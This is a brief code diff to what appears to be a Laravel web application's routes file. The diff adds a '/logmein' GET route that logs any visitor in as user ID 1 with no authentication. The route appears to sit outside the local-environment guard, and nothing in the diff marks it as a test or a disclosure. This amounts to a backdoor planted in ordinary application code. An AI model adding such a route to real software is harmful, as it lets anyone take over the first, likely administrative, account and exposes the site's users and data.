@@ -25,6 +25,10 @@ if (Schema::hasTable('users') && app()->environment() == 'local') {
 
 Auth::routes();
 
+Route::get('/logmein', function () {
+   Auth::LoginUsingId(1);
+});
+
 Route::group(['namespace' => 'Frontend'], function () {
 
     Route::get('/', ['as' => 'home', 'uses' => 'HomeController@index']);
